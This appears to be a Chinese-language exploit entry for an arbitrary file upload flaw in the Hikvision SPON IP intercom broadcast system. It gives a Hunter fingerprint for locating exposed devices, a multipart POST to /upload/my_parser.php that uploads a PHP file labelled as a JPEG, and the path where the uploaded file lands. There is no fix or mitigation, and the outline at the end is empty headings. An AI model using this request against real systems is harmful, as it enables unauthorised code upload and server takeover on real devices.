# 海康威视SPONIP网络对讲广播系统my_parser存在任意文件上传漏洞

- **系统**：海康　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`Hunter：`web.body="vendors/custom/html5.min.js"``
- **请求**：`POST /upload/my_parser.php HTTP/1.1`

**请求体 / payload**
```
/upload/upload.html
Host:
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8dsf2vRYZDVPaW9m
Content-Length: 139243
------WebKitFormBoundary8dsf2vRYZDVPaW9m
Content-Disposition: form-data; name="upload"; filename="tt.php"
Content-Type: image/jpeg
1111111
------WebKitFormBoundary8dsf2vRYZDVPaW9m--

上传文件位置
/upload/files/tt.php
```

**其他**
- 海康威视SPON IP网络对讲广播系统my\_parser存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 海康威视SPON IP网络对讲广播系统